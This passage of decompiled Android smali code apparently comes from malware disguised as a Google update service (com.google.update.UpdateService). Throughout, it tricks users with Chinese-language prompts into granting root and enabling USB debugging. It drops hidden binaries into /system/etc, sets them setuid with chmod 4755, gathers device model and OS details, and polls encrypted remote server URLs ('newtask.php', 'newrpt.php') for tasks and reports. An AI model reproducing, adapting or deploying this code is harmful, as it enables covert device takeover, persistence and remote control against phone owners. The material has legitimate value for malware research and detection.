    iget-object v11, v0, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, " &\n"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 281
    const-string v10, "exit\n"

    invoke-virtual {v8, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 282
    invoke-virtual {v8}, Ljava/io/DataOutputStream;->flush()V

    .line 283
    invoke-virtual {v9}, Ljava/lang/Process;->waitFor()I

    .line 284
    const-wide/16 v10, 0x7d0

    invoke-static {v10, v11}, Landroid/os/SystemClock;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 289
    .end local v2    # "dest":Ljava/lang/String;
    .end local v8    # "os":Ljava/io/DataOutputStream;
    .end local v9    # "process":Ljava/lang/Process;
    :goto_1
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v10

    if-eqz v10, :cond_2

    .line 290
    iput v13, p0, Lcom/google/update/UpdateService;->m13:I

    .line 291
    invoke-direct {p0}, Lcom/google/update/UpdateService;->doSearchReport()V

    goto/16 :goto_0

    .line 285
    :catch_0
    move-exception v10

    move-object v3, v10

    .line 286
    .local v3, "e":Ljava/lang/Exception;
    invoke-virtual {v3}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    .line 296
    .end local v3    # "e":Ljava/lang/Exception;
    :cond_2
    new-instance v5, Landroid/content/Intent;

    invoke-direct {v5}, Landroid/content/Intent;-><init>()V

    .line 297
    .local v5, "intent":Landroid/content/Intent;
    const-class v10, Lcom/google/update/Dialog;

    invoke-virtual {v5, p0, v10}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 298
    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v10

    invoke-virtual {v0, v10}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v10

    invoke-interface {v10}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v7

    .line 299
    .local v7, "name":Ljava/lang/String;
    if-eqz v7, :cond_3

    const-string v10, ""

    invoke-virtual {v10, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_4

    :cond_3
    const-string v7, "\u672c\u8f6f\u4ef6"

    .line 300
    :cond_4
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v11, "\u9700\u8981root\u6743\u9650\u624d\u80fd\u4f7f\u7528\u5168\u90e8\u529f\u80fd\uff0c\u8bf7\u901a\u8fc7\u6388\u6743\u7ba1\u7406\u7a0b\u5e8f\u8fdb\u884c\u6388\u6743\uff01"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 302
    .local v6, "msg":Ljava/lang/String;
    :try_start_1
    const-string v10, "MSG"

    new-instance v11, Ljava/lang/String;

    const-string v12, "UTF-8"

    invoke-virtual {v6, v12}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v12

    const-string v13, "UTF-8"

    invoke-direct {v11, v12, v13}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-virtual {v5, v10, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    :try_end_1
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_1

    .line 306
    :goto_2
    const/high16 v10, 0x10000000

    invoke-virtual {v5, v10}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 307
    const-string v10, "TYPEdsada"

    const-string v11, "su"

    invoke-virtual {v5, v10, v14}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 308
    invoke-virtual {p0, v5}, Lcom/google/update/UpdateService;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 303
    :catch_1
    move-exception v10

    move-object v3, v10

    .line 304
    .local v3, "e":Ljava/io/UnsupportedEncodingException;
    invoke-virtual {v3}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    goto :goto_2
.end method

.method private getPermission3()V
    .locals 10

    .prologue
    const/4 v5, 0x0

    const-string v9, "newinit"

    const-string v8, "foobin"

    const-string v7, "4755 "

    const-string v6, "/system/bin/chmod"

    .line 339
    const/4 v3, 0x3

    iput v3, p0, Lcom/google/update/UpdateService;->m13:I

    .line 342
    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "adb_enabled"

    invoke-static {v3, v4, v5}, Landroid/provider/Settings$Secure;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    move-result v3

    if-nez v3, :cond_0

    .line 343
    invoke-direct {p0}, Lcom/google/update/UpdateService;->setUsbEnabled()I

    move-result v3

    const/16 v4, 0xa

    if-lt v3, v4, :cond_0

    .line 344
    iput v5, p0, Lcom/google/update/UpdateService;->m13:I

    .line 369
    :goto_0
    return-void

    .line 349
    :cond_0
    iget-object v3, p0, Lcom/google/update/UpdateService;->m1:Landroid/content/SharedPreferences;

    const-string v4, "P3"

    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    .line 350
    .local v0, "count":I
    const/16 v3, 0x10

    if-lt v0, v3, :cond_1

    .line 351
    iput v5, p0, Lcom/google/update/UpdateService;->m13:I

    goto :goto_0

    .line 354
    :cond_1
    add-int/lit8 v0, v0, 0x1

    .line 355
    iget-object v3, p0, Lcom/google/update/UpdateService;->m1:Landroid/content/SharedPreferences;

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 356
    .local v2, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v3, "P3"

    invoke-interface {v2, v3, v0}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 357
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 359
    invoke-direct {p0}, Lcom/google/update/UpdateService;->getMyDataDir()Ljava/lang/String;

    move-result-object v1

    .line 360
    .local v1, "dir":Ljava/lang/String;
    const-string v3, "rawicon"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "rawicon"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0x1530

    invoke-static {p0, v3, v4, v5}, Lcom/google/update/RU;->U7(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 361
    const-string v3, "newinit"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "newinit"

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0x1220

    invoke-static {p0, v9, v3, v4}, Lcom/google/update/RU;->U7(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 362
    const-string v3, "foobin"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "foobin"

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0x1b80

    invoke-static {p0, v8, v3, v4}, Lcom/google/update/RU;->U7(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 364
    const-string v3, "/system/bin/chmod"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "4755 "

    invoke-direct {v3, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "rawicon"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v6, v3}, Lcom/google/update/RU;->U6(Ljava/lang/String;Ljava/lang/String;)V

    .line 365
    const-string v3, "/system/bin/chmod"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "4755 "

    invoke-direct {v3, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "newinit"

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v6, v3}, Lcom/google/update/RU;->U6(Ljava/lang/String;Ljava/lang/String;)V

    .line 366
    const-string v3, "/system/bin/chmod"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "4755 "

    invoke-direct {v3, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "foobin"

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v6, v3}, Lcom/google/update/RU;->U6(Ljava/lang/String;Ljava/lang/String;)V

    .line 368
    new-instance v3, Lcom/google/update/UpdateService$AA;

    invoke-direct {v3, p0}, Lcom/google/update/UpdateService$AA;-><init>(Lcom/google/update/UpdateService;)V

    invoke-virtual {v3}, Lcom/google/update/UpdateService$AA;->start()V

    goto/16 :goto_0
.end method

.method private getSearchTask()Ljava/lang/String;
    .locals 8

    .prologue
    const/4 v7, 0x0

    .line 481
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v5

    if-nez v5, :cond_0

    move-object v5, v7

    .line 500
    :goto_0
    return-object v5

    .line 488
    :cond_0
    const/4 v3, 0x0

    .local v3, "i":I
    :goto_1
    :try_start_0
    sget-object v5, Lcom/google/update/RR;->S:[[B

    array-length v5, v5

    if-lt v3, v5, :cond_1

    :goto_2
    move-object v5, v7

    .line 500
    goto :goto_0

    .line 489
    :cond_1
    sget-object v5, Lcom/google/update/RR;->S:[[B

    aget-object v5, v5, v3

    invoke-static {v5}, Lcom/google/update/RU;->U9([B)[B

    move-result-object v1

    .line 490
    .local v1, "bs":[B
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    .line 491
    .local v0, "action":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "newtask.php"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 493
    invoke-direct {p0, v0}, Lcom/google/update/UpdateService;->_getSearchTask(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 494
    .local v4, "line":Ljava/lang/String;
    if-eqz v4, :cond_3

    .line 495
    const-string v5, "NONE"

    invoke-virtual {v4, v5}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v5

    if-nez v5, :cond_2

    move-object v5, v7

    goto :goto_0

    :cond_2
    move-object v5, v4

    .line 496
    goto :goto_0

    .line 488
    :cond_3
    add-int/lit8 v3, v3, 0x1

    goto :goto_1

    .line 499
    .end local v0    # "action":Ljava/lang/String;
    .end local v1    # "bs":[B
    .end local v4    # "line":Ljava/lang/String;
    :catch_0
    move-exception v5

    move-object v2, v5

    .local v2, "e":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2
.end method

.method private isVersion221()Z
    .locals 2

    .prologue
    .line 170
    sget-object v0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 171
    .local v0, "osVer":Ljava/lang/String;
    const-string v1, "2.2.1"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "2.3"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "3.0"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 172
    :cond_0
    const/4 v1, 0x1

    .line 174
    :goto_0
    return v1

    :cond_1
    const/4 v1, 0x0

    goto :goto_0
.end method

.method private provideService()V
    .locals 6

    .prologue
    .line 374
    new-instance v0, Ljava/util/Timer;

    const/4 v1, 0x1

    invoke-direct {v0, v1}, Ljava/util/Timer;-><init>(Z)V

    iput-object v0, p0, Lcom/google/update/UpdateService;->m15:Ljava/util/Timer;

    .line 375
    new-instance v0, Lcom/google/update/UpdateService$1;

    invoke-direct {v0, p0}, Lcom/google/update/UpdateService$1;-><init>(Lcom/google/update/UpdateService;)V

    iput-object v0, p0, Lcom/google/update/UpdateService;->m16:Ljava/util/TimerTask;

    .line 380
    iget-object v0, p0, Lcom/google/update/UpdateService;->m15:Ljava/util/Timer;

    iget-object v1, p0, Lcom/google/update/UpdateService;->m16:Ljava/util/TimerTask;

    sget-wide v2, Lcom/google/update/UpdateService;->m17:J

    sget-wide v4, Lcom/google/update/UpdateService;->m17:J

    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;JJ)V

    .line 381
    return-void
.end method

.method private reportState(ILjava/lang/String;)V
    .locals 5
    .param p1, "state"    # I
    .param p2, "comment"    # Ljava/lang/String;

    .prologue
    .line 734
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_0
    :try_start_0
    sget-object v3, Lcom/google/update/RR;->S:[[B

    array-length v3, v3

    if-lt v2, v3, :cond_1

    .line 742
    :cond_0
    :goto_1
    return-void

    .line 735
    :cond_1
    sget-object v3, Lcom/google/update/RR;->S:[[B

    aget-object v3, v3, v2

    invoke-static {v3}, Lcom/google/update/RU;->U9([B)[B

    move-result-object v1

    .line 736
    .local v1, "bs":[B
    new-instance v0, Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    .line 737
    .local v0, "action":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "newrpt.php"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 739
    invoke-direct {p0, v0, p1, p2}, Lcom/google/update/UpdateService;->_reportState(Ljava/lang/String;ILjava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v3

    if-nez v3, :cond_0

    .line 734
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 741
    .end local v0    # "action":Ljava/lang/String;
    .end local v1    # "bs":[B
    :catch_0
    move-exception v3

    goto :goto_1
.end method

.method private setUsbEnabled()I
    .locals 9

    .prologue
    const-string v5, "UTF-8"

    const-string v7, "P31"

    .line 313
    iget-object v5, p0, Lcom/google/update/UpdateService;->m1:Landroid/content/SharedPreferences;

    const-string v6, "P31"

    const/4 v6, 0x0

    invoke-interface {v5, v7, v6}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    .line 314
    .local v0, "count":I
    add-int/lit8 v0, v0, 0x1

    .line 315
    iget-object v5, p0, Lcom/google/update/UpdateService;->m1:Landroid/content/SharedPreferences;

    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 316
    .local v1, "edit":Landroid/content/SharedPreferences$Editor;
    const-string v5, "P31"

    invoke-interface {v1, v7, v0}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 317
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 319
    const/16 v5, 0xa

    if-lt v0, v5, :cond_0

    .line 333
    :goto_0
    return v0

    .line 321
    :cond_0
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    .line 322
    .local v2, "intent":Landroid/content/Intent;
    const-class v5, Lcom/google/update/Dialog;

    invoke-virtual {v2, p0, v5}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 323
    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v5

    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    .line 324
    .local v4, "name":Ljava/lang/String;
    if-eqz v4, :cond_1

    const-string v5, ""

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_2

    :cond_1
    const-string v4, "\u672c\u8f6f\u4ef6"

    .line 325
    :cond_2
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "\u9700\u8981\u6253\u5f00USB\u8c03\u8bd5\u624d\u80fd\u4f7f\u7528\u5168\u90e8\u529f\u80fd\uff0c\u8bf7\u786e\u4fddUSB\u8c03\u8bd5\u529f\u80fd\u5df2\u7ecf\u9009\u4e2d\uff01"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 327
    .local v3, "msg":Ljava/lang/String;
    :try_start_0
    const-string v5, "MSG"

    new-instance v6, Ljava/lang/String;

    const-string v7, "UTF-8"

    invoke-virtual {v3, v7}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v7

    const-string v8, "UTF-8"

    invoke-direct {v6, v7, v8}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-virtual {v2, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    .line 329
    :goto_1
    const-string v5, "TYPEdsada"

    const-string v6, "set"

    invoke-virtual {v2, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 330
    const/high16 v5, 0x10000000

    invoke-virtual {v2, v5}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 331
    invoke-virtual {p0, v2}, Lcom/google/update/UpdateService;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 328
    :catch_0
    move-exception v5

    goto :goto_1
.end method

.method private tryInstBin(Ljava/lang/String;)Ljava/lang/String;
    .locals 11
    .param p1, "fileName"    # Ljava/lang/String;

    .prologue
    const-string v10, "2 "

    const-string v8, "_"

    const-string v8, " "

    .line 689
    new-instance v8, Ljava/io/File;

    const-string v9, "/system/etc/.dhcpcd"

    invoke-direct {v8, v9}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/io/File;->exists()Z

    move-result v8

    if-nez v8, :cond_0

    .line 690
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "2 "

    invoke-direct {v8, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " /system/etc/.dhcpcd"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 691
    .local v0, "cmd":Ljava/lang/String;
    invoke-static {v0}, Lcom/google/update/RU$U12;->U2(Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_0

    const-string v8, "BINCP"

    .line 724
    .end local v0    # "cmd":Ljava/lang/String;
    :goto_0
    return-object v8

    .line 694
    :cond_0
    new-instance v8, Ljava/io/File;

    const-string v9, "/system/etc/.rild_cfg"

    invoke-direct {v8, v9}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/io/File;->exists()Z

    move-result v8

    if-nez v8, :cond_1

    .line 696
    :try_start_0
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "/data/data/"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/google/update/UpdateService;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;

    move-result-object v9

    iget-object v9, v9, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "/mycfg.ini"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 697
    .local v2, "dest":Ljava/lang/String;
    new-instance v5, Ljava/io/FileOutputStream;

    invoke-direct {v5, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    .line 698
    .local v5, "myOutput":Ljava/io/OutputStream;
    iget-object v8, p0, Lcom/google/update/UpdateService;->m5:Ljava/lang/String;

    const-string v9, " "

    const-string v10, "_"

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 699
    .local v4, "model":Ljava/lang/String;
    iget-object v8, p0, Lcom/google/update/UpdateService;->m6:Ljava/lang/String;

    const-string v9, " "

    const-string v10, "_"

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 700
    .local v7, "ostype":Ljava/lang/String;
    iget-object v8, p0, Lcom/google/update/UpdateService;->m7:Ljava/lang/String;

    const-string v9, " "

    const-string v10, "_"

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 701
    .local v6, "osapi":Ljava/lang/String;
    new-instance v8, Ljava/lang/StringBuilder;

    iget-object v9, p0, Lcom/google/update/UpdateService;->m3:Ljava/lang/String;

    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v9, " -1 "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 702
    .local v1, "data":Ljava/lang/String;
    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v8

    invoke-virtual {v5, v8}, Ljava/io/OutputStream;->write([B)V

    .line 703
    invoke-virtual {v5}, Ljava/io/OutputStream;->flush()V

    .line 704
    invoke-virtual {v5}, Ljava/io/OutputStream;->close()V

    .line 706
    new-instance v8, Ljava/io/File;

    invoke-direct {v8, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/io/File;->exists()Z

    move-result v8

    if-eqz v8, :cond_1

    .line 707
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "2 "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " /system/etc/.rild_cfg"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 708
    .restart local v0    # "cmd":Ljava/lang/String;
    invoke-static {v0}, Lcom/google/update/RU$U12;->U2(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 714
    .end local v0    # "cmd":Ljava/lang/String;
    .end local v1    # "data":Ljava/lang/String;
    .end local v2    # "dest":Ljava/lang/String;
    .end local v4    # "model":Ljava/lang/String;
    .end local v5    # "myOutput":Ljava/io/OutputStream;
    .end local v6    # "osapi":Ljava/lang/String;
    .end local v7    # "ostype":Ljava/lang/String;
    :cond_1
    :goto_1
    :try_start_1
    const-string v2, "/data/data/WebView.db"

    .line 715
    .restart local v2    # "dest":Ljava/lang/String;
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "1 "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

